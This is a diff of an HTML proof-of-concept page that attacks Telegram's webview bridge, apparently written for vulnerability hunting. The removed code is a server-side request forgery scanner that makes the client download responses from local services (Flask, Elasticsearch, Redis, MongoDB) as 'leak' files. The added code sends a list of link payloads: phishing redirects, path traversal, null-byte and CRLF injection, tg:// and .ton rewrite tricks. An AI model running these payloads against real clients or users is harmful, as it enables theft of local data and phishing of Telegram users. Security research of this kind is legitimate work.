@@ -1,63 +1,64 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>SSRF PoC v6</title>
+<head><meta charset="utf-8"><title>openTgLink PoC</title>
 <style>
 body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
 h2{color:#0f0;margin:0 0 4px 0}
 #log{background:#111;padding:6px;max-height:260px;overflow:auto;white-space:pre-wrap;font:11px monospace}
 button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
 button.fire{background:#4a0000;border-color:#f44;font-size:13px}
-.green{color:#0f0}
+.green{color:#0f0}.red{color:#f44}.yellow{color:#ff0}
 </style></head><body>
-<h2>SSRF PoC v6 — TelegramWebviewProxy</h2>
+<h2>openTgLink PoC</h2>
 <div id="log">Init...</div>
 <div id="btns"></div>
 
 <script>
-const L = (s,c) => { const e=document.getElementById('log'); e.innerHTML += `<span class="${c||''}">${s}</span>\n`; e.scrollTop = e.scrollHeight; };
+const L=(s,c)=>{const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">${s}</span>\n`;e.scrollTop=e.scrollHeight;};
 
 L('Checking bridge...','green');
-
-const T = [
-  ['http://127.0.0.1:5000/', 'flask_leak.json', 'Flask (:5000)'],
-  ['http://127.0.0.1:9200/', 'elastic_leak.json', 'Elastic (:9200)'],
-  ['http://127.0.0.1:6379/', 'redis_leak.txt', 'Redis (:6379)'],
-  ['http://127.0.0.1:27017/', 'mongo_leak.txt', 'MongoDB (:27017)'],
-  ['http://127.0.0.1:9999/ssrf_capture', 'capture.json', 'Monitor (:9999)'],
-];
-
-const proxy = window.TelegramWebviewProxy;
-if (proxy && typeof proxy.postEvent === 'function') {
+if (window.TelegramWebviewProxy && window.TelegramWebviewProxy.postEvent) {
   L('TelegramWebviewProxy OK!','green');
 } else {
-  L('TelegramWebviewProxy NOT FOUND','err');
-  L('Fallback: checking window.external...');
+  L('NO BRIDGE','red');
 }
 
-const send = (cmd, data) => {
-  L(`TX: ${cmd} ${JSON.stringify(data)}`);
-  if (window.TelegramWebviewProxy && window.TelegramWebviewProxy.postEvent) {
-    window.TelegramWebviewProxy.postEvent(cmd, data);
-  } else if (window.external && window.external.invoke) {
-    window.external.invoke(JSON.stringify([cmd, data]));
-  } else {
-    L('ERROR: no bridge available!');
-  }
+const tgLink = (path) => {
+  L(`TX: web_app_open_tg_link path_full="${path}"`);
+  window.TelegramWebviewProxy.postEvent('web_app_open_tg_link', {
+    path_full: path
+  });
 };
 
-let idx = 0;
-function fireAll() { idx=0; next(); }
-function next() {
-  if (idx>=T.length) { L('=== DONE === Check http://127.0.0.1:9999','green'); return; }
-  const [u,n,d]=T[idx]; L(`[${++idx}/${T.length}] ${d}`);
-  send('web_app_request_file_download', {url:u, file_name:n});
-  setTimeout(next, 2500);
-}
+const tests = [
+  // Basic path traversal / phishing
+  { name: '@phish redirect',   path: '@phishing_bot',   desc: 'https://t.me@phishing_bot → open redirect?' },
+  { name: 'Double @',          path: '@a@b',             desc: 'https://t.me@a@b → parser confusion?' },
+  { name: '../ traversal',     path: '/../../../',       desc: 'Path traversal attempt' },
+  { name: 'null byte',         path: '/%00/evil',        desc: 'Null byte injection' },
+  { name: 'newline',           path: '/%0a%0d/evil',     desc: 'CRLF injection' },
+  
+  // .ton domain bait
+  { name: '.ton injection',    path: '/evil.ton',        desc: 'Triggers tonsite:// rewrite (line 1888)' },
+  { name: '.ton in middle',    path: '/test.ton/stuff',  desc: '.ton substring match anywhere' },
+  
+  // tg:// injection
+  { name: 'tg:// inject',      path: '/../../../tg://resolve?domain=evil', desc: 'tg:// override?' },
+  
+  // Whitespace / encoding
+  { name: 'space bypass',      path: '/ settings',       desc: 'Space in path' },
+  { name: 'unicode',           path: '/\u2024/',         desc: 'Unicode dot (ONE DOT LEADER)' },
+  
+  // Empty / normal (control)
+  { name: 'empty path',        path: '',                 desc: 'Empty path → https://t.me' },
+  { name: 'normal user',       path: '/durov',           desc: 'Normal → opens Durov profile' },
+];
 
-document.getElementById('btns').innerHTML = `
-  <button class="fire" onclick="fireAll()">FIRE: Scan All 5 Services</button>
-  ${T.map(([u,n,d],i) => `<button onclick="send('web_app_request_file_download',{url:'${u}',file_name:'${n}'})">${d}</button>`).join('')}
-`;
+document.getElementById('btns').innerHTML = tests.map((t,i) => 
+  `<button onclick="tgLink('${t.path.replace(/'/g,"\\'")}');L('Test: ${t.name}','yellow')">${t.name}: ${t.path}</button>`
+).join('');
+
+L(`Ready. ${tests.length} payloads.`,'green');
 </script>
 </body>
 </html>
